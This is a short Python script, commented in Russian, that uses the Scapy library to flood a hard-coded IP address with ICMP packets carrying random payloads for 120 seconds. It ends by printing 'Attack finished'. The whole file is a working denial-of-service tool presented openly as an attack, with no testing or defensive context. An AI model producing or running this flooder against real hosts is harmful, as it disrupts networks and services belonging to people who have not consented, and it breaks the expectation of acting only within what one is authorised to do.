import random
import sys
from scapy.all import *

# Получаем IP адрес, размер пакета и время работы из аргументов командной строки
#target_ip = sys.argv[1]
#packet_size = int(sys.argv[2])
#attack_duration = int(sys.argv[3])
target_ip='192.168.1.1'
packet_size=100
attack_duration = 120

# Создаем функцию для создания и отправки ICMP пакетов
def send_icmp_packet(target_ip, packet_size):
    packet = IP(dst=target_ip)/ICMP()/Raw(load=''.join(chr(random.randint(0, 255)) for _ in range(packet_size)))
    send(packet, verbose=False)

# Запускаем цикл отправки пакетов на протяжении указанного времени
end_time = time.time() + attack_duration
while time.time() < end_time:
    send_icmp_packet(target_ip, packet_size)

print("Attack finished")
